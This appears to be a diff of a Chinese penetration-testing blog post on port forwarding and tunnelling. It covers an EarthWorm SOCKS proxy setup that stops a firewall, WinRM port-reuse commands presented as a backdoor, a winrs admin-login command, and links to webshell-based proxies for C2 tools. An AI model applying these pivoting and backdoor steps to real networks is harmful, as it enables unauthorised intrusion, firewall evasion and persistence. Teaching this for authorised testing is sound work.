+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/113.png" alt></li>
+</ol>
+<p><strong>正向代理例子：本地10.0.0.1、服务器10.0.0.3/100.0.0.1、100.0.0.2</strong></p>
+<ol>
+<li>关闭10.0.0.3的防火墙，如centos7：<code>systemctl stop firewalld</code></li>
+<li>上传ew_for_linux，执行</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/114.png" alt></li>
+<li>本地10.0.0.1添加代理配置/etc/proxychains.conf</li>
+<li><code>socks5 10.0.0.3 8888</code></li>
+<li>代理访问内网主机100.0.0.2</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/115.png" alt></li>
+</ol>
+<hr>
+<h2 id="0x80-端口复用"><a href="#0x80-端口复用" class="headerlink" title="0x80 端口复用"></a>0x80 端口复用</h2><h3 id="0x81-windows-WinRM端口复用"><a href="#0x81-windows-WinRM端口复用" class="headerlink" title="0x81 windows WinRM端口复用"></a>0x81 windows WinRM端口复用</h3><ol>
+<li><p>模拟场景：服务器只允许80和443为出入口。</p>
+<p> 1<strong>利用原理与知识：</strong></p>
+</li>
+<li><p>微软在windows server 2003中加入了http.sys（内核驱动程序），用于侦听http流量并根据URL进行处理，允许任意用户进程共享专用于HTTP流量的TCP端口。即：通过http.sys，多个进程将能够侦听同一个端口上的HTTP流量，只需要各自注册的url前缀不同即可。</p>
+</li>
+<li><p><strong>列出所有URL的DACL：</strong><code>netsh http show urlacl</code></p>
+</li>
+<li><p><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/64.png" alt></p>
+</li>
+<li><p>5985对应http的端口，5986对应https的端口</p>
+</li>
+<li><p>查看所有在HTTP.sys上注册过的url前缀：</p>
+</li>
+<li><p><code>netsh http show servicestate</code></p>
+</li>
+<li><p><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/65.png" alt></p>
+</li>
+<li><p>WinRM服务，全称Windows Remote Management，能够实现在远程主机上执行命令，默认监听5985端口。</p>
+</li>
+<li><p>HTTP Server API：使应用程序能够接收定向到URL的HTTP请求并发送HTTP响应。</p>
+</li>
+<li><p>Windows Server 2008默认关闭WinRM服务，Windows Server 2012默认开启。</p>
+</li>
 </ol>
 <p><strong>winrm使用：</strong><br>5. <code>winrm</code> #帮助<br>5. <code>winrm quickconfig -q</code> #windows server 2008快速配置和启动的命令<br>6. <code>winrm e winrm/config/listener</code> #查看监听配置<br>7. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/66.png" alt><br>7. <code>winrm get winrm/config</code> #查看winrm配置<br>8. <code>winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;true&quot;}</code> #新增对80端口的监听<br>9. <code>winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;false&quot;}</code> #删除80端口的监听<br>9. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/67.png" alt><br>10. <code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;}</code> #修改WinRM端口<br>11. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/71.png" alt><br>11. <code>netsh http show servicestate</code> #http.sys新注册的url前缀<br>11. <img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/68.png" alt></p>
 <p><strong>后门连接使用：</strong></p>
@@ -1575,7 +1830,19 @@
 <li><code>winrs -r:http://[目标ip] -u:[普通管理员] -p:[目标密码] &quot;whoami /groups&quot; | findstr &quot;Mandatory Label\High Mandatory Level&quot;</code></li>
 </ol>
 <p><strong>Hash登录</strong><br><a href="https://paper.seebug.org/1004/" target="_blank" rel="noopener">https://paper.seebug.org/1004/</a></p>
-<h3 id="0x92-利用HTTP-Server-API实现端口复用"><a href="#0x92-利用HTTP-Server-API实现端口复用" class="headerlink" title="0x92 利用HTTP Server API实现端口复用"></a>0x92 利用HTTP Server API实现端口复用</h3><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/</a></p>
+<h3 id="0x82-利用HTTP-Server-API实现端口复用"><a href="#0x82-利用HTTP-Server-API实现端口复用" class="headerlink" title="0x82 利用HTTP Server API实现端口复用"></a>0x82 利用HTTP Server API实现端口复用</h3><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/</a></p>
+<h2 id="mssql代理"><a href="#mssql代理" class="headerlink" title="mssql代理"></a>mssql代理</h2><ol>
+<li><a href="https://x-c3ll.github.io/posts/Pivoting-MySQL-Proxy/" target="_blank" rel="noopener">https://x-c3ll.github.io/posts/Pivoting-MySQL-Proxy/</a></li>
+<li><a href="https://xz.aliyun.com/t/7993" target="_blank" rel="noopener">https://xz.aliyun.com/t/7993</a></li>
+<li><a href="https://github.com/blackarrowsec/mssqlproxy" target="_blank" rel="noopener">https://github.com/blackarrowsec/mssqlproxy</a></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/116.png" alt></li>
+</ol>
+<h2 id="pystinger"><a href="#pystinger" class="headerlink" title="pystinger"></a>pystinger</h2><ol>
+<li><a href="https://github.com/FunnyWolf/pystinger" target="_blank" rel="noopener">https://github.com/FunnyWolf/pystinger</a></li>
+<li>毒刺(pystinger)通过webshell实现内网SOCK4代理,端口映射.</li>
+<li>可直接用于metasploit-framework,viper,cobalt strike上线.</li>
+<li><a href="https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md" target="_blank" rel="noopener">https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md</a></li>
+</ol>
 <h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">frp中文版readme</a><br><a href="https://paper.seebug.org/1004/" target="_blank" rel="noopener">一条命令实现端口复用后门</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/" target="_blank" rel="noopener">利用IIS的端口共享功能绕过防火墙</a></p>
 
       
@@ -1590,7 +1857,7 @@
     
     <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
     <p><span class="copy-title">发布时间:</span>2020-01-05, 02:38:08</p>
-    <p><span class="copy-title">最后更新:</span>2020-07-15, 22:59:58</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-05, 13:26:22</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" title="端口转发与隧道技术">https://10fteam.github.io/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -1635,7 +1902,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#工具','#知识','#内网渗透','#CS','#C2','#kali','#漏洞','#CTF','#encrypt_decrypt','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#proxy','#linux','#脚本','#MSF','#PHP','#代码审计','#backdoor','#shell','#数据库','#database','#PWN','#python','#注入','#phpmyadmin','#SQL','#中间件','#WAF','#Struts2','#vulhub','#CVE','#mssql','#windows','#mimikatz','#xss','#DOM','#bypass','#cms','#weblogic','#encode_decode','#靶场','#vulnhub','#僵尸网络','#后门','#远控','#免杀','#webshell','#域渗透','#端口','#CDN','#提权','#DLL','#MISC','#逆向','#editor','#log',],
+            'data': ['#CTF','#encrypt_decrypt','#kali','#工具','#C2','#漏洞','#知识','#backdoor','#shell','#内网渗透','#CS','#HTB','#靶机','#writeup','#linux','#脚本','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#CC','#拒绝服务','#DOS','#proxy','#MSF','#PHP','#代码审计','#数据库','#database','#PWN','#注入','#phpmyadmin','#SQL','#python','#mssql','#中间件','#vulhub','#CVE','#Struts2','#WAF','#windows','#mimikatz','#xss','#DOM','#bypass','#cms','#后门','#靶场','#vulnhub','#僵尸网络','#encode_decode','#域渗透','#webshell','#内存马','#远控','#免杀','#端口','#CDN','#提权','#DLL','#蓝方','#防守','#editor','#MISC','#逆向','#log','#powershell','#后渗透','#FTP','#日志',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
